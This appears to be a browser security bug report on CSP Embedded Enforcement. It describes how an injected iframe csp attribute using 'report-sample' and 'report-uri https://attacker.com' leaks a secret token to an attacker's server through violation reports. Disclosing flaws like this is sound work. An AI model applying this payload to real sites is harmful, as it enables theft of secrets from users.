Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/embenf.html
2. Violation report including secret token is leaked to attacker's URL

What is the expected behavior?
Maybe disallow report-uri or script-sample in iframe's csp attribute?

What went wrong?
Scenario:
https://vuln.shhnjk.com trusts https://test.shhnjk.com. So https://vuln.shhnjk.com/allowcsp.php has "Allow-CSP-From: https://test.shhnjk.com" header set.

Now attacker found HTML injection in https://test.shhnjk.com. So he/she injected iframe with csp attribute "script-src 'sha256-test' 'report-sample'; report-uri https://attacker.com".

Because attacker injected 'report-sample' and 'report-uri', attacker gets secret token in the script of https://vuln.shhnjk.com/allowcsp.php.

Did this work before? N/A

Let me know if this is acceptable risk in Embedded Enforcement. Then I'll blog about it.
